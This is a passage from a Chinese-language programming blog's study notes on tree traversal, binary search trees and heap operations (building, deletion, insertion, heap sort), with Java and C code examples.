class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        self.quickSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></div></figure>




        <h1 id="树"   >
          <a href="#树" class="heading-link"><i class="fas fa-link"></i></a><a href="#树" class="headerlink" title="树"></a>树</h1>
      
        <h2 id="遍历"   >
          <a href="#遍历" class="heading-link"><i class="fas fa-link"></i></a><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2>
      <p>以下图为例子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017141835811.png" alt="image-20221017141835811"></p>
<ul>
<li><p>先序遍历：首先访问根节点，然后访问左子树，最后访问右子树。</p>
<p>顺序为：0-1-3-4-2-5-6</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTraverse</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    System.out.println(root.val);</span><br><span class="line">    beforeTraverse(root.left);</span><br><span class="line">    beforeTraverse(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>中序遍历：首先访问左子树，然后访问根结点，最后访问右子树。</p>
<p>顺序为：3-1-4-0-5-2-6</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTraverse</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    beforeTraverse(root.left);</span><br><span class="line">    System.out.println(root.val);</span><br><span class="line">    beforeTraverse(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>后序遍历：首先访问左子树，然后访问右子树，最后访问根结点。</p>
<p>顺序为：3-4-1-5-6-2-0</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTraverse</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    beforeTraverse(root.left);</span><br><span class="line">    beforeTraverse(root.right);</span><br><span class="line">    System.out.println(root.val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="二叉搜索树"   >
          <a href="#二叉搜索树" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2>
      <p>二叉查找树、二叉排序树</p>
<p>若它的左子树不空，则左子树上所有结点的值均小于它的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉搜索树</p>
<p>以下图为例子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017142607148.png" alt="image-20221017142607148"></p>
<p>那么二叉搜索树的中序遍历即为递增序列：0-1-2-3-4-5-6</p>

        <h1 id="堆"   >
          <a href="#堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆" class="headerlink" title="堆"></a>堆</h1>
      <p>堆是一颗完全二叉树</p>
<p>要求排序时间算法复杂度为<code>O(nlogn)</code>常用堆排序</p>

        <h2 id="建堆-1"   >
          <a href="#建堆-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#建堆-1" class="headerlink" title="建堆"></a>建堆</h2>
      <p>都是从<code>idx</code>最大的非叶子结点的子树开始，将不满足大(小)顶堆的子树递归进行下沉操作</p>

        <h3 id="大顶堆"   >
          <a href="#大顶堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#大顶堆" class="headerlink" title="大顶堆"></a>大顶堆</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxShiftDown</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> rootIdx, <span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> maxIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = leftIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = rightIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( maxIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[maxIdx];</span><br><span class="line">        <span class="built_in">array</span>[maxIdx] = tmp;</span><br><span class="line">        maxShiftDown(<span class="built_in">array</span>, maxIdx, heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        maxShiftDown(<span class="built_in">array</span>, i, heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    buildMaxHeap(nums,<span class="number">27</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="小顶堆"   >
          <a href="#小顶堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#小顶堆" class="headerlink" title="小顶堆"></a>小顶堆</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minShiftDown</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> rootIdx, <span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> minIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &lt; <span class="built_in">array</span>[minIdx])&#123;</span><br><span class="line">        minIdx = leftIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &lt; <span class="built_in">array</span>[minIdx])&#123;</span><br><span class="line">        minIdx = rightIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(minIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[minIdx];</span><br><span class="line">        <span class="built_in">array</span>[minIdx] = tmp;</span><br><span class="line">        minShiftDown(<span class="built_in">array</span>, minIdx, heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMinHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        minShiftDown(<span class="built_in">array</span>, i, heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    buildMinHeap(nums,<span class="number">27</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>合起来加个<code>flag</code>即可决定大顶堆还是小顶堆了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shiftDown</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> rootIdx, <span class="keyword">int</span> heapSize, <span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> chooseIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">0</span>)&#123;      <span class="comment">//小顶堆</span></span><br><span class="line">        <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &lt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = leftIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &lt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = rightIdx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123; <span class="comment">//大顶堆</span></span><br><span class="line">        <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = leftIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = rightIdx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(chooseIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[chooseIdx];</span><br><span class="line">        <span class="built_in">array</span>[chooseIdx] = tmp;</span><br><span class="line">        shiftDown(<span class="built_in">array</span>, chooseIdx, heapSize, flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize,<span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        shiftDown(<span class="built_in">array</span>, i, heapSize,flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> heapSize = <span class="number">27</span>;</span><br><span class="line">    buildHeap(nums,heapSize,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="删除-1"   >
          <a href="#删除-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除-1" class="headerlink" title="删除"></a>删除</h2>
      <p>一般只能删除堆顶元素</p>
<p>从删除堆顶元素，将堆尾部元素放到堆顶，然后下沉该元素</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shiftDown</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> rootIdx, <span class="keyword">int</span> heapSize, <span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> chooseIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">0</span>)&#123;      <span class="comment">//小顶堆</span></span><br><span class="line">        <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &lt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = leftIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &lt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = rightIdx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123; <span class="comment">//大顶堆</span></span><br><span class="line">        <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = leftIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = rightIdx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(chooseIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[chooseIdx];</span><br><span class="line">        <span class="built_in">array</span>[chooseIdx] = tmp;</span><br><span class="line">        shiftDown(<span class="built_in">array</span>, chooseIdx, heapSize, flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> heapSize = <span class="number">27</span>;</span><br><span class="line">    buildHeap(nums,heapSize,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//heapSort(nums,heapSize,0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除堆顶元素,然后下沉</span></span><br><span class="line">    nums[<span class="number">0</span>] = nums[heapSize<span class="number">-1</span>];</span><br><span class="line">    heapSize -= <span class="number">1</span>;</span><br><span class="line">    shiftDown(nums,<span class="number">0</span>,heapSize,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="插入"   >
          <a href="#插入" class="heading-link"><i class="fas fa-link"></i></a><a href="#插入" class="headerlink" title="插入"></a>插入</h2>
      <p>总是在堆尾部插入元素，然后对该元素执行上浮操作</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shiftUp</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> insertIdx,<span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> parentIdx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(insertIdx == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(insertIdx % <span class="number">2</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        parentIdx = (insertIdx - <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        parentIdx = (insertIdx - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">0</span>)&#123;<span class="comment">//小顶堆</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">array</span>[parentIdx] &gt; <span class="built_in">array</span>[insertIdx])&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = <span class="built_in">array</span>[insertIdx];</span><br><span class="line">            <span class="built_in">array</span>[insertIdx] = <span class="built_in">array</span>[parentIdx];</span><br><span class="line">            <span class="built_in">array</span>[parentIdx] = tmp;</span><br><span class="line">            shiftUp(<span class="built_in">array</span>,parentIdx,flag);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;<span class="comment">//大顶堆</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">array</span>[parentIdx] &lt; <span class="built_in">array</span>[insertIdx])&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = <span class="built_in">array</span>[insertIdx];</span><br><span class="line">            <span class="built_in">array</span>[insertIdx] = <span class="built_in">array</span>[parentIdx];</span><br><span class="line">            <span class="built_in">array</span>[parentIdx] = tmp;</span><br><span class="line">            shiftUp(<span class="built_in">array</span>,parentIdx,flag);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> heapSize = <span class="number">27</span>;</span><br><span class="line">    buildMinHeap(nums,heapSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除堆顶元素,然后下沉</span></span><br><span class="line">    nums[<span class="number">0</span>] = nums[heapSize<span class="number">-1</span>];</span><br><span class="line">    heapSize -= <span class="number">1</span>;</span><br><span class="line">    minShiftDown(nums,<span class="number">0</span>,heapSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入0元素到堆尾,然后上浮</span></span><br><span class="line">    nums[heapSize] = <span class="number">0</span>;</span><br><span class="line">    shiftUp(nums,heapSize,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="排序"   >
          <a href="#排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#排序" class="headerlink" title="排序"></a>排序</h2>
      <p>依次取堆顶元素，然后执行下沉操作使得堆依旧满足大(顶)堆，即可自行决定升序还是降序</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> heapSize,<span class="keyword">int</span> flag)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = heapSize - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[i];</span><br><span class="line">        <span class="built_in">array</span>[i] = <span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">array</span>[<span class="number">0</span>] = tmp;</span><br><span class="line">        heapSize -= <span class="number">1</span>;</span><br><span class="line">        shiftDown(<span class="built_in">array</span>, <span class="number">0</span>, heapSize,flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cs.usfca.edu/~galles/visualization/BST.html" >在线演示BST网址：https://www.cs.usfca.edu/~galles/visualization/BST.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="输入输出练习"   >
          <a href="#输入输出练习" class="heading-link"><i class="fas fa-link"></i></a><a href="#输入输出练习" class="headerlink" title="输入输出练习"></a>输入输出练习</h1>
      <p>主要是<code>python</code></p>

        <h2 id="A-B"   >
